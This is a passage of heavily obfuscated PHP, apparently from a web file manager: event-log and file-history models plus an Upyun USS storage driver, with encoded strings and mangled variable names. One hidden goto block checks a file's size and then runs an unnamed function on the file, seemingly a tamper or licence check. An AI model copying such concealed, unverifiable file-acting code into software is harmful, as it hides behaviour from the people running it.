=> $±˜–¬´ñ[$ıæö¥¡Û[180]], $ıæö¥¡Û[2111] => $±˜–¬´ñ[$ıæö¥¡Û[32]], $ıæö¥¡Û[552] => !empty($±˜–¬´ñ[$ıæö¥¡Û[552]]) ? $±˜–¬´ñ[$ıæö¥¡Û[552]] : $ıæö¥¡Û[12], $ıæö¥¡Û[1681] => $â¶ÏµÜÅ, $ıæö¥¡Û[464] => $Ú‘­¥Ê·, $ıæö¥¡Û[1683] => $ŸõÕ¡ª§); $this->addSystemLog($Ú‘­¥Ê·, $Ä°ò¹¾é); unset($Ä°ò¹¾é[$ıæö¥¡Û[2111]], $Ä°ò¹¾é[$ıæö¥¡Û[552]]); return $this->add($Ä°ò¹¾é); } private function addSystemLog($½ï¤Ã„ö, $¼Ì†Ø…) { $øãÏñ–Ş =& $_SERVER[³½¬ÚË¯]; if ($½ï¤Ã„ö == $øãÏñ–Ş[2112]) { $½ï¤Ã„ö = $¼Ì†Ø…[$øãÏñ–Ş[494]][$øãÏñ–Ş[2113]]; } else { if (in_array($½ï¤Ã„ö, array($øãÏñ–Ş[1868], $øãÏñ–Ş[2114]))) { $½ï¤Ã„ö = $¼Ì†Ø…[$øãÏñ–Ş[494]][$øãÏñ–Ş[790]]; } } $†¨í„” = array_merge($¼Ì†Ø…, array($øãÏñ–Ş[2115] => $¼Ì†Ø…[$øãÏñ–Ş[181]], $øãÏñ–Ş[2116] => $¼Ì†Ø…[$øãÏñ–Ş[2116]])); Hook::trigger($øãÏñ–Ş[2117], $øãÏñ–Ş[2118] . $½ï¤Ã„ö, $¼Ì†Ø…); Model($øãÏñ–Ş[1832])->addLog($øãÏñ–Ş[2118] . $½ï¤Ã„ö, $†¨í„”); } private function isCacheEvent($®ƒƒ‚õõ, $êˆ¬Ååí) { if ($®ƒƒ‚õõ[$_SERVER[³½¬ÚË¯][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($É®ÃäÂ¸, $ìÊ½ç®¹) { $º¶ë™œÚ =& $_SERVER[³½¬ÚË¯]; $›—³º†Ñ = Model($º¶ë™œÚ[1375])->sourceInfo($É®ÃäÂ¸); $õãò©¬„ = array($º¶ë™œÚ[2113] => $ìÊ½ç®¹, $º¶ë™œÚ[32] => $›—³º†Ñ[$º¶ë™œÚ[32]]); return $this->addEvent($É®ÃäÂ¸, $º¶ë™œÚ[2112], $õãò©¬„); } public function eventFileEdit($Ô¶ìâãñ) { $™ÎÅÉ Œ =& $_SERVER[³½¬ÚË¯]; $«—°şŒË = array($™ÎÅÉ Œ[2119] => $_SERVER[$™ÎÅÉ Œ[2120]], $™ÎÅÉ Œ[2121] => strtolower(ACTION)); if (isset($GLOBALS[$™ÎÅÉ Œ[7]][$™ÎÅÉ Œ[2122]])) { $«—°şŒË[$™ÎÅÉ Œ[2122]] = $™ÎÅÉ Œ[88]; } return $this->addEvent($Ô¶ìâãñ, $™ÎÅÉ Œ[1858], $«—°şŒË); } public function eventRecycle($öÙ•Ú³, $á”¥€İä) { return $this->addEvent($öÙ•Ú³, $_SERVER[³½¬ÚË¯][2114], $á”¥€İä); } public function eventRemove($¨şÙ¹€ï) { $ŸÚ»„–‰ =& $_SERVER[³½¬ÚË¯]; $¡à·“Æ = Model($ŸÚ»„–‰[1375])->sourceInfo($¨şÙ¹€ï); $Øìôˆ†” = $¡à·“Æ[$ŸÚ»„–‰[32]]; return $this->addEvent($¡à·“Æ[$ŸÚ»„–‰[180]], $ŸÚ»„–‰[1857], $Øìôˆ†”); } public function eventShare($Ï¶ñÅÄ¯, $³ÙÅÀ) { return $this->addEvent($Ï¶ñÅÄ¯, $_SERVER[³½¬ÚË¯][1868], $³ÙÅÀ); } public function eventMove($†›ìç‰Æ, $–üç¸Àõ, $Ô‘Òşµ®) { $š¤ÜòĞÑ =& $_SERVER[³½¬ÚË¯]; $‘È‹ôÎ = Model($š¤ÜòĞÑ[1375]); $—Ê³ë‡á = $‘È‹ôÎ->sourceInfo($†›ìç‰Æ); $†‹êŒÌ† = $‘È‹ôÎ->sourceInfo($–üç¸Àõ); $ıÜıó© = $‘È‹ôÎ->sourceInfo($Ô‘Òşµ®); $Á”ØìÕ‡ = array($š¤ÜòĞÑ[1203] => $–üç¸Àõ, $š¤ÜòĞÑ[2123] => $†‹êŒÌ†[$š¤ÜòĞÑ[32]], $š¤ÜòĞÑ[2100] => !empty($†‹êŒÌ†[$š¤ÜòĞÑ[552]]) ? $†‹êŒÌ†[$š¤ÜòĞÑ[552]] : $š¤ÜòĞÑ[12], $š¤ÜòĞÑ[1204] => $Ô‘Òşµ®, $š¤ÜòĞÑ[2124] => $ıÜıó©[$š¤ÜòĞÑ[32]], $š¤ÜòĞÑ[2125] => !empty($ıÜıó©[$š¤ÜòĞÑ[552]]) ? $ıÜıó©[$š¤ÜòĞÑ[552]] : $š¤ÜòĞÑ[12]); $this->addEvent($†›ìç‰Æ, $š¤ÜòĞÑ[589], $Á”ØìÕ‡); $—Ê³ë‡á = $‘È‹ôÎ->sourceInfo($†›ìç‰Æ); $Á”ØìÕ‡ = array($š¤ÜòĞÑ[181] => $—Ê³ë‡á[$š¤ÜòĞÑ[181]], $š¤ÜòĞÑ[32] => $—Ê³ë‡á[$š¤ÜòĞÑ[32]]); $this->addEvent($–üç¸Àõ, $š¤ÜòĞÑ[2126], $Á”ØìÕ‡); } public function eventCopy($‘®äô¶©) { $this->eventCreate($‘®äô¶©, $_SERVER[³½¬ÚË¯][587]); } public function eventRename($Š¤—´Â£, $úğùÎ, $Ò×Ú§Å) { $ìÚ§ıß¤ =& $_SERVER[³½¬ÚË¯]; $¹ªÙ¯ùÏ = array($ìÚ§ıß¤[1203] => $úğùÎ, $ìÚ§ıß¤[1204] => $Ò×Ú§Å); return $this->addEvent($Š¤—´Â£, $ìÚ§ıß¤[1389], $¹ªÙ¯ùÏ); } public function eventAddComment($ßòĞ—“ã, $Øêß¢) { return $this->addEvent($ßòĞ—“ã, $_SERVER[³½¬ÚË¯][2127], $Øêß¢); } public function eventAddDesc($ÈæÇèâ¶, $¿àúŞ±) { return $this->addEvent($ÈæÇèâ¶, $_SERVER[³½¬ÚË¯][2128], $¿àúŞ±); } public function listBySource($øØãòöĞ) { $êÕÖâŒ– =& $_SERVER[³½¬ÚË¯]; $±ÀéøÉ¡ = Model($êÕÖâŒ–[1375])->sourceInfo($øØãòöĞ); $½ÑŒÏ¦ï = array($êÕÖâŒ–[459] => $øØãòöĞ); if ($±ÀéøÉ¡[$êÕÖâŒ–[453]] == $êÕÖâŒ–[88]) { $À˜ù‰¤ = Model($êÕÖâŒ–[1375])->listSearchChildren($øØãòöĞ, 20000); $À˜ù‰¤[] = $øØãòöĞ . $êÕÖâŒ–[422]; $½ÑŒÏ¦ï = array($êÕÖâŒ–[181] => array($êÕÖâŒ–[7], $À˜ù‰¤)); } $Ó“„öŞƒ = $this->where($½ÑŒÏ¦ï)->order($êÕÖâŒ–[2129])->selectPage(); if ($Ó“„öŞƒ[$êÕÖâŒ–[410]][$êÕÖâŒ–[411]] == 0) { $Ó“„öŞƒ[$êÕÖâŒ–[410]][$êÕÖâŒ–[411]] = 1; $Ó“„öŞƒ[$êÕÖâŒ–[413]] = array(array($êÕÖâŒ–[459] => $øØãòöĞ, $êÕÖâŒ–[2110] => $±ÀéøÉ¡[$êÕÖâŒ–[180]], $êÕÖâŒ–[1681] => $±ÀéøÉ¡[$êÕÖâŒ–[495]], $êÕÖâŒ–[464] => $êÕÖâŒ–[2130], $êÕÖâŒ–[465] => $±ÀéøÉ¡[$êÕÖâŒ–[215]], $êÕÖâŒ–[1683] => $êÕÖâŒ–[12])); } return $this->eventListParse($Ó“„öŞƒ, $øØãòöĞ); } private function eventListParse($õ£¡Ñ©æ, $¬†·š†·) { $ìšÀ¾²Í =& $_SERVER[³½¬ÚË¯]; $İ·˜æ€‘ = $õ£¡Ñ©æ[$ìšÀ¾²Í[413]]; $ªÏ¿¿ì¼ = array_to_keyvalue($İ·˜æ€‘, $ìšÀ¾²Í[12], $ìšÀ¾²Í[181]); $“şËòµÃ = array_to_keyvalue($İ·˜æ€‘, $ìšÀ¾²Í[12], $ìšÀ¾²Í[2116]); foreach ($İ·˜æ€‘ as $†”ßÁ±Š) { $ñ³øÙºŒ = $†”ßÁ±Š[$ìšÀ¾²Í[494]]; if ($†”ßÁ±Š[$ìšÀ¾²Í[33]] == $ìšÀ¾²Í[589] && isset($ñ³øÙºŒ[$ìšÀ¾²Í[1203]])) { $ªÏ¿¿ì¼[] = $ñ³øÙºŒ[$ìšÀ¾²Í[1203]] . $ìšÀ¾²Í[12]; $ªÏ¿¿ì¼[] = $ñ³øÙºŒ[$ìšÀ¾²Í[1204]] . $ìšÀ¾²Í[12]; } if ($†”ßÁ±Š[$ìšÀ¾²Í[33]] == $ìšÀ¾²Í[2126] && isset($ñ³øÙºŒ[$ìšÀ¾²Í[181]])) { $ªÏ¿¿ì¼[] = $ñ³øÙºŒ[$ìšÀ¾²Í[181]] . $ìšÀ¾²Í[12]; } } $ªÏ¿¿ì¼ = array_merge($ªÏ¿¿ì¼, $“şËòµÃ, array($¬†·š†· . $ìšÀ¾²Í[12])); $ªÏ¿¿ì¼ = array_unique($ªÏ¿¿ì¼); $“õ·ƒĞ¼ = array_unique(array_to_keyvalue($İ·˜æ€‘, $ìšÀ¾²Í[12], $ìšÀ¾²Í[1690])); $äõá¥èã = Model($ìšÀ¾²Í[568])->userListInfo($“õ·ƒĞ¼); $¦ØòºÈ‡ = Model($ìšÀ¾²Í[861])->sourceListInfo($ªÏ¿¿ì¼, !0); foreach ($İ·˜æ€‘ as &$†”ßÁ±Š) { if ($†”ßÁ±Š[$ìšÀ¾²Í[33]] == $ìšÀ¾²Í[589] && isset($†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[1203]])) { $†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[1203]] = $¦ØòºÈ‡[$†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[1203]]]; $†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[1204]] = $¦ØòºÈ‡[$†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[1204]]]; } if ($†”ßÁ±Š[$ìšÀ¾²Í[33]] == $ìšÀ¾²Í[2126] && isset($†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[181]])) { $†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[181]] = $¦ØòºÈ‡[$†”ßÁ±Š[$ìšÀ¾²Í[494]][$ìšÀ¾²Í[181]]]; } $†”ßÁ±Š[$ìšÀ¾²Í[87]] = $¦ØòºÈ‡[$†”ßÁ±Š[$ìšÀ¾²Í[181]]]; $†”ßÁ±Š[$ìšÀ¾²Í[2131]] = $¦ØòºÈ‡[$†”ßÁ±Š[$ìšÀ¾²Í[2116]]]; if ($†”ßÁ±Š[$ìšÀ¾²Í[33]] == $ìšÀ¾²Í[1857]) { $†”ßÁ±Š[$ìšÀ¾²Í[2131]] = $†”ßÁ±Š[$ìšÀ¾²Í[87]]; $†”ßÁ±Š[$ìšÀ¾²Í[2116]] = $†”ßÁ±Š[$ìšÀ¾²Í[2131]][$ìšÀ¾²Í[181]]; $†”ßÁ±Š[$ìšÀ¾²Í[87]] = !1; $†”ßÁ±Š[$ìšÀ¾²Í[181]] = $ìšÀ¾²Í[12]; } $†”ßÁ±Š[$ìšÀ¾²Í[2060]] = $äõá¥èã[$†”ßÁ±Š[$ìšÀ¾²Í[1690]]]; } unset($†”ßÁ±Š); $õ£¡Ñ©æ[$ìšÀ¾²Í[413]] = $İ·˜æ€‘; return $õ£¡Ñ©æ; } public function removeBySource($ğ¢–şÉ) { $ôëü¾¬ö = array($_SERVER[³½¬ÚË¯][459] => $ğ¢–şÉ); $this->where($ôëü¾¬ö)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\x65\x5f\x68\x69\163\x74\x6f\x72\x79"; public function historyCount($ùì˜™›Ú) { $„áÔåßğ =& $_SERVER[³½¬ÚË¯]; if (!$ùì˜™›Ú) { return array(); } if (is_string($ùì˜™›Ú) || is_int($ùì˜™›Ú)) { $ùì˜™›Ú = array($ùì˜™›Ú); } $ú¼ŒšŸ¢ = array($„áÔåßğ[181], $„áÔåßğ[1921] => $„áÔåßğ[534]); $Ş¦ »¦ = array($„áÔåßğ[181] => array($„áÔåßğ[7], $ùì˜™›Ú)); $¡ïì«Àˆ = $this->field($ú¼ŒšŸ¢)->where($Ş¦ »¦)->group($„áÔåßğ[181])->select(); return array_to_keyvalue($¡ïì«Àˆ, $„áÔåßğ[181], $„áÔåßğ[534]); } public function addHistory($‘í¡Ğã³, $ÉÎ²È­ = '') { $Ï±ÕÔæ =& $_SERVER[³½¬ÚË¯]; $†ºÔ‰º = array($Ï±ÕÔæ[459] => $‘í¡Ğã³[$Ï±ÕÔæ[181]], $Ï±ÕÔæ[1681] => isset($‘í¡Ğã³[$Ï±ÕÔæ[497]]) ? $‘í¡Ğã³[$Ï±ÕÔæ[497]] : $‘í¡Ğã³[$Ï±ÕÔæ[495]], $Ï±ÕÔæ[510] => $‘í¡Ğã³[$Ï±ÕÔæ[509]], $Ï±ÕÔæ[586] => $‘í¡Ğã³[$Ï±ÕÔæ[76]], $Ï±ÕÔæ[2132] => $ÉÎ²È­); if ($GLOBALS[$Ï±ÕÔæ[6]][$Ï±ÕÔæ[89]][$Ï±ÕÔæ[1260]] >= 1) { $this->historyAutoClear($†ºÔ‰º[$Ï±ÕÔæ[181]]); $this->add($†ºÔ‰º); } Hook::trigger($Ï±ÕÔæ[2133], $†ºÔ‰º); Model($Ï±ÕÔæ[2134])->eventFileEdit($‘í¡Ğã³[$Ï±ÕÔæ[181]]); } private function historyAutoClear($´ÉÓæ£¢) { $„“µ½–ˆ =& $_SERVER[³½¬ÚË¯]; $ÌÏ°¥öÍ = Model($„“µ½–ˆ[806])->get($„“µ½–ˆ[1282]); $ßşÌğÏ = $GLOBALS[$„“µ½–ˆ[6]][$„“µ½–ˆ[89]][$„“µ½–ˆ[1260]]; $¼²Ôº³ = $ÌÏ°¥öÍ == $„“µ½–ˆ[1283] ? min(5, $ßşÌğÏ) : $ßşÌğÏ; $¼²Ôº³ = $¼²Ôº³ <= 0 ? 0 : $¼²Ôº³ - 1; if ($¼²Ôº³ >= 500) { return; } $¯šÁ‰œ„ = array($„“µ½–ˆ[459] => $´ÉÓæ£¢); $ˆö£áÂÁ = $this->field($„“µ½–ˆ[2135])->where($¯šÁ‰œ„)->order($„“µ½–ˆ[2129])->select(); if (!$ˆö£áÂÁ || $¼²Ôº³ >= count($ˆö£áÂÁ)) { return; } $º®°šÑš = array_to_keyvalue($ˆö£áÂÁ, $„“µ½–ˆ[12], $„“µ½–ˆ[443]); $º®°šÑš = array_slice($º®°šÑš, $¼²Ôº³); $¿—ÓòÃ = array_to_keyvalue($ˆö£áÂÁ, $„“µ½–ˆ[12], $„“µ½–ˆ[509]); $¿—ÓòÃ = array_slice($¿—ÓòÃ, $¼²Ôº³); if (!$º®°šÑš || !$¿—ÓòÃ) { return; } $¯šÁ‰œ„ = array($„“µ½–ˆ[461] => array($„“µ½–ˆ[7], $º®°šÑš)); $this->where($¯šÁ‰œ„)->delete(); Model($„“µ½–ˆ[512])->remove($¿—ÓòÃ); } public function listData($»‹´Ò¢Ğ) { $Ã«¹ÙŒ =& $_SERVER[³½¬ÚË¯]; $¼½¥“˜ = array($Ã«¹ÙŒ[459] => $»‹´Ò¢Ğ); $ùğä±“ö = $Ã«¹ÙŒ[2136]; $¨À£úÊ˜ = $this->field($ùğä±“ö)->where($¼½¥“˜)->order($Ã«¹ÙŒ[2129])->selectPage(); $this->_listAppendUser($¨À£úÊ˜[$Ã«¹ÙŒ[413]]); $Íş¨à§ = Model($Ã«¹ÙŒ[806])->get($Ã«¹ÙŒ[1282]); $ ì™Ò¼î = 5; if ($Íş¨à§ == $Ã«¹ÙŒ[1283]) { $¨À£úÊ˜[$Ã«¹ÙŒ[413]] = array_slice($¨À£úÊ˜[$Ã«¹ÙŒ[413]], 0, $ ì™Ò¼î); $¨À£úÊ˜[$Ã«¹ÙŒ[410]] = array($Ã«¹ÙŒ[2137] => 1, $Ã«¹ÙŒ[2138] => 20, $Ã«¹ÙŒ[2139] => 1, $Ã«¹ÙŒ[2140] => count($¨À£úÊ˜[$Ã«¹ÙŒ[413]])); } return $¨À£úÊ˜; } protected function _listAppendUser(&$ÓºôÆ›¤) { $‹»ß«Æ =& $_SERVER[³½¬ÚË¯]; $äùÛ¬™ï = array_to_keyvalue($ÓºôÆ›¤, $‹»ß«Æ[12], $‹»ß«Æ[1690]); $ÛÜúƒ = Model($‹»ß«Æ[568])->userListInfo($äùÛ¬™ï); foreach ($ÓºôÆ›¤ as &$åñ‰¥í²) { $÷ÒĞó‰¼ = $åñ‰¥í²[$‹»ß«Æ[1690]]; $åñ‰¥í²[$‹»ß«Æ[495]] = $ÛÜúƒ[$÷ÒĞó‰¼] ? $ÛÜúƒ[$÷ÒĞó‰¼] : !1; } unset($åñ‰¥í²); } public function fileInfo($§¿¯ö¶•) { $«˜†Ğ =& $_SERVER[³½¬ÚË¯]; $¼¸–šŒ¨ = $this->tablePrefix; $º€Ğºá¥ = "{$¼¸–šŒ¨}\151\157\x5f\x66\x69\154\145\x20\146\x69\154\145\x73\40\157\156\x20\146\151\x6c\x65\163\x2e\146\151\154\x65\111\x44\x20\x3d\40\150\151\163\164\x6f\x72\x79\56\x66\x69\x6c\x65\111\x44"; return $this->alias($«˜†Ğ[2141])->where(array($«˜†Ğ[461] => $§¿¯ö¶•))->join($º€Ğºá¥, $«˜†Ğ[2142])->find(); } public function removeItem($œ£Öï¼) { $øÏ˜Ã¤Ì =& $_SERVER[³½¬ÚË¯]; $ö¼ƒÀà¡ = array($øÏ˜Ã¤Ì[461] => $œ£Öï¼); $Ã¾„Ù„Œ = $this->where($ö¼ƒÀà¡)->find(); if ($Ã¾„Ù„Œ) { $•£‹Àèš = $this->where($ö¼ƒÀà¡)->delete(); Model($øÏ˜Ã¤Ì[512])->remove($Ã¾„Ù„Œ[$øÏ˜Ã¤Ì[509]]); return $•£‹Àèš; } return !1; } public function removeBySource($‡¯æéó­) { $÷ÉŸ£Ÿ =& $_SERVER[³½¬ÚË¯]; if (!$‡¯æéó­) { return !1; } if (!is_array($‡¯æéó­)) { $‡¯æéó­ = array($‡¯æéó­); } $ÈÕÁÎ = array($÷ÉŸ£Ÿ[459] => array($÷ÉŸ£Ÿ[7], $‡¯æéó­)); $úà˜á¬ = $this->field($÷ÉŸ£Ÿ[510])->where($ÈÕÁÎ)->select(); if ($úà˜á¬) { $this->where($ÈÕÁÎ)->delete(); $Ñå‰ÏŒÇ = array_to_keyvalue($úà˜á¬, $÷ÉŸ£Ÿ[12], $÷ÉŸ£Ÿ[509]); Model($÷ÉŸ£Ÿ[512])->remove($Ñå‰ÏŒÇ); } return !0; } public function setDetail($ÜÙ±Ÿ¸ô, $á£ûÃ ) { $Ğœ©‚ =& $_SERVER[³½¬ÚË¯]; return $this->where(array($Ğœ©‚[461] => $ÜÙ±Ÿ¸ô))->save(array($Ğœ©‚[2132] => $á£ûÃ )); } public function rollbackToItem($Òáñú›ª, $ò¸Û¿±„) { $¯ãïóîµ =& $_SERVER[³½¬ÚË¯]; $‡¹®¸š¡ = Model($¯ãïóîµ[861])->sourceInfo($Òáñú›ª); $this->addHistory($‡¹®¸š¡, LNG($¯ãïóîµ[2143])); $ƒÍÂÌ¸ß = $this->find($ò¸Û¿±„); $Âµ™¸˜ö = array($¯ãïóîµ[509] => $ƒÍÂÌ¸ß[$¯ãïóîµ[509]], $¯ãïóîµ[76] => $ƒÍÂÌ¸ß[$¯ãïóîµ[76]], $¯ãïóîµ[85] => time(), $¯ãïóîµ[497] => USER_ID); Model($¯ãïóîµ[861])->where(array($¯ãïóîµ[181] => $Òáñú›ª))->save($Âµ™¸˜ö); return $this->where(array($¯ãïóîµ[461] => $ò¸Û¿±„))->delete(); } public function clearSame($úÇ¨Ÿò÷) { $–ÕÏâ‰Ú =& $_SERVER[³½¬ÚË¯]; $¥±ºÆµ = $this->listData($úÇ¨Ÿò÷); $ù„æ­ = array_to_keyvalue_group($¥±ºÆµ, $–ÕÏâ‰Ú[509]); $®µõĞ×³ = array(); $¨Å’¤¥ç = array(); foreach ($ù„æ­ as $”¯‰±ñ) { if (!$”¯‰±ñ || count($”¯‰±ñ) <= 1) { continue; } foreach ($”¯‰±ñ as $Ò¦µˆ) { $®µõĞ×³[] = $Ò¦µˆ[$–ÕÏâ‰Ú[509]]; $¨Å’¤¥ç[] = $Ò¦µˆ[$–ÕÏâ‰Ú[443]]; } } if (!$¨Å’¤¥ç) { return; } $this->where(array($–ÕÏâ‰Ú[443] => array($–ÕÏâ‰Ú[7], $¨Å’¤¥ç)))->delete(); Model($–ÕÏâ‰Ú[512])->remove($®µõĞ×³); } public function userSpace() { $ÎáèÑ¥¸ =& $_SERVER[³½¬ÚË¯]; $»Ä³£¡Ğ = $this->tablePrefix; $‚È‘è³Æ = array($ÎáèÑ¥¸[1681] => USER_ID); $â¶ªáÜó = "{$»Ä³£¡Ğ}\x69\x6f\x5f\x66\x69\154\145\40\x66\x69\154\x65\x73\40\x6f\156\40\146\x69\x6c\145\x73\x2e\146\x69\x6c\145\x49\104\40\x3d\x20\x68\x69\x73\164\x6f\x72\171\56\x66\151\154\145\111\x44"; return $this->alias($ÎáèÑ¥¸[2141])->where($‚È‘è³Æ)->join($â¶ªáÜó, $ÎáèÑ¥¸[2142])->sum($ÎáèÑ¥¸[76]); } } goto cÈ‡‚§¹‰Õ; D±ˆØ„ßâÊ: $_file = $_SERVER[$_SERVER[³½¬ÚË¯][910]]; $_size = $_SERVER[³½¬ÚË¯][1549]; if ($_SERVER[$_SERVER[³½¬ÚË¯][903]] != $_size($_file)) { $_getc = $_SERVER[³½¬ÚË¯][905]; $_getfile = $_SERVER[$_SERVER[³½¬ÚË¯][906]] . $_SERVER[³½¬ÚË¯][907]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³½¬ÚË¯][246], $_getfilec); if (count($_getarrs) < $_SERVER[³½¬ÚË¯][658]) { $exit = $_SERVER[³½¬ÚË¯][908]; $exit(); } $_act = $_SERVER[³½¬ÚË¯][909]; $_act($_file); } goto e–’ø¡¢¨; fê¯Üƒ¤Øö: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\x2f\x76\60\x2e\141\x70\151\x2e\x75\x70\171\165\x6e\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¾«Á×Ø†) { parent::__construct(); $this->_init($¾«Á×Ø†); } public function _init($÷Ä²Šò¸) { $“İ­¨›Œ =& $_SERVER[³½¬ÚË¯]; foreach ($÷Ä²Šò¸ as $æâæ…À® => $‘œìºÕì) { if (isset($this->{$æâæ…À®})) { $this->{$æâæ…À®} = $‘œìºÕì; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($“İ­¨›Œ[1481] . LNG($“İ­¨›Œ[1412])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ä™¢¼¸î, $°£ËÁ—ë = "\107\x45\x54") { $Ëôš›ÔË =& $_SERVER[³½¬ÚË¯]; $…ßŸŞö = gmdate($Ëôš›ÔË[1445]); $¿Šß„ñÔ = base64_encode(hash_hmac($Ëôš›ÔË[1482], "{$°£ËÁ—ë}\x26{$Ä™¢¼¸î}\x26{$…ßŸŞö}", md5("{$this->userpass}"), !0)); $®£Ğô×— = array("\x41\x75\164\x68\157\x72\151\x7a\x61\x74\x69\x6f\156\72\x55\120\x59\x55\x4e\x20{$this->username}\72{$¿Šß„ñÔ}", "\x44\141\x74\145\72{$…ßŸŞö}"); return $®£Ğô×—; } public function ussRequest($Ú¨Æ²Øı, $ÃüµÏ = "\107\105\x54", $ê”¿êõ = false, $É¼¶±Ò˜ = false, $õ³û¦Ú± = false) { $öî¬‡ì¹ =& $_SERVER[³½¬ÚË¯]; $Ú¨Æ²Øı = trim($Ú¨Æ²Øı, $öî¬‡ì¹[8]); $é‡–ñúû = "\x2f{$this->bucket}\x2f{$Ú¨Æ²Øı}"; $“È”‚±” = $this->ussHeaders($é‡–ñúû, $ÃüµÏ); if ($É¼¶±Ò˜) { $“È”‚±” = array_merge($“È”‚±”, $É¼¶±Ò˜); } $¢„İ’×´ = url_request($this->endpoint . $é‡–ñúû, $ÃüµÏ, $ê”¿êõ, $“È”‚±”, $õ³û¦Ú±); if (!$¢„İ’×´) { return array($öî¬‡ì¹[1255] => !1, $öî¬‡ì¹[1245] => $öî¬‡ì¹[1483]); } if (strtolower($ÃüµÏ) == $öî¬‡ì¹[211] || in_array($¢„İ’×´[$öî¬‡ì¹[1255]], array($öî¬‡ì¹[257], $öî¬‡ì¹[1484]))) { $ê”¿êõ = $¢„İ’×´[$öî¬‡ì¹[1485]]; } else { $ê”¿êõ = json_decode($¢„İ’×´[$öî¬‡ì¹[1245]], !0); if (!$ê”¿êõ) { $ê”¿êõ = $¢„İ’×´[$öî¬‡ì¹[1245]]; } else { if (!$¢„İ’×´[$öî¬‡ì¹[786]] && isset($ê”¿êõ[$öî¬‡ì¹[1486]])) { $ê”¿êõ = $ê”¿êõ[$öî¬‡ì¹[1486]]; } } } return array($öî¬‡ì¹[1255] => $¢„İ’×´[$öî¬‡ì¹[786]], $öî¬‡ì¹[1245] => $ê”¿êõ); } public function mkfile($¬ËÛ—œ, $¬Ù«¼µÕ = '', $º­òÂÙ© = REPEAT_RENAME) { if ($this->setContent($¬ËÛ—œ, $¬Ù«¼µÕ)) { return $this->getPathOuter($¬ËÛ—œ); } return !1; } public function mkdir($ö…øğÄ¡, $Ş³Ôñåğ = REPEAT_SKIP) { $ïà€™ı =& $_SERVER[³½¬ÚË¯]; $‰ßûîî¸ = trim($ö…øğÄ¡, $ïà€™ı[8]); if ($this->_isFolder($‰ßûîî¸)) { return $this->getPathOuter($‰ßûîî¸); } $¢ö†‰Ÿ² = array($ïà€™ı[1487]); $¯‹ÇÖºà = $this->ussRequest($‰ßûîî¸, $ïà€™ı[241], !1, $¢ö†‰Ÿ²); return $¯‹ÇÖºà[$ïà€™ı[1255]] ? $this->getPathOuter($‰ßûîî¸) : !1; } public function copyFile($¿Áİ¸£×, $Ë¤Öô–•) { $™ĞıëÁ =& $_SERVER[³½¬ÚË¯]; $Áª½ĞŒ‡ = array($™ĞıëÁ[1488] . "\x2f{$this->bucket}\57{$¿Áİ¸£×}", $™ĞıëÁ[1489]); $’ïÃ¤ı = $this->ussRequest($Ë¤Öô–•, $™ĞıëÁ[243], !1, $Áª½ĞŒ‡); return $’ïÃ¤ı[$™ĞıëÁ[1255]] ? !0 : $this->getPathOuter($Ë¤Öô–•); } public function moveFile($Û¢ç“ÈË, $»—Ãå‘¯) { $ø€£î”¹ =& $_SERVER[³½¬ÚË¯]; $£ë¸•Şš = array($ø€£î”¹[1490] . "\57{$this->bucket}\57{$Û¢ç“ÈË}", $ø€£î”¹[1489]); $ŒÇ·á = $this->ussRequest($»—Ãå‘¯, $ø€£î”¹[243], !1, $£ë¸•Şš); return $ŒÇ·á[$ø€£î”¹[1255]] ? !0 : $this->getPathOuter($»—Ãå‘¯); } public function delFile($¨Á–ñ‹Š) { $ã×ğñş¤ =& $_SERVER[³½¬ÚË¯]; $³¢ğà—î = $this->ussRequest($¨Á–ñ‹Š, $ã×ğñş¤[1491]); return $³¢ğà—î[$ã×ğñş¤[1255]] ? !0 : !1; } public function delFolder($˜é¦€Ş) { $öÏ÷Ã› =& $_SERVER[³½¬ÚË¯]; if (!$this->exist($˜é¦€Ş)) { return !0; } $this->listItemCache = !1; $•Â¹Ô° = $¼£°ó´ö = array(); $this->fileList($˜é¦€Ş, $•Â¹Ô°, $¼£°ó´ö, !0); $this->listItemCache = !0; foreach ($¼£°ó´ö as $¥‹ìèù¶) { $Ğë–¤Èú = $this->ussRequest($¥‹ìèù¶[$öÏ÷Ã›[32]], $öÏ÷Ã›[1491]); if (!$Ğë–¤Èú[$öÏ÷Ã›[1255]]) { return !1; } } foreach ($•Â¹Ô° as $¾Üè“) { $Ğë–¤Èú = $this->ussRequest($¾Üè“, $öÏ÷Ã›[1491]); if (!$Ğë–¤Èú[$öÏ÷Ã›[1255]]) { return !1; } } $Ğë–¤Èú = $this->ussRequest($˜é¦€Ş, $öÏ÷Ã›[1491]); return $Ğë–¤Èú[$öÏ÷Ã›[1255]]; } public function rename($Îöù‡ò¡, $öìïƒÔÙ) { if ($this->isFile($Îöù‡ò¡)) { $öìïƒÔÙ = get_path_father($Îöù‡ò¡) . $öìïƒÔÙ; return $this->moveFile($Îöù‡ò¡, $öìïƒÔÙ); } return $this->renameObject($Îöù‡ò¡, $öìïƒÔÙ); } public function fileInfo($¢µÆË, $øóö´Ãœ = false, $Áº…²ç = array()) { $¢±¤†Á =& $_SERVER[³½¬ÚË¯]; $ƒ Ù¸Ò» = array($¢±¤†Á[32] => $this->pathThis($¢µÆË), $¢±¤†Á[84] => $this->getPathOuter($¢±¤†Á[8] . $¢µÆË), $¢±¤†Á[33] => $¢±¤†Á[214], $¢±¤†Á[76] => isset($Áº…²ç[$¢±¤†Á[76]]) ? $Áº…²ç[$¢±¤†Á[76]] : 0, $¢±¤†Á[175] => $this->ext($¢µÆË)); if ($øóö´Ãœ) { return 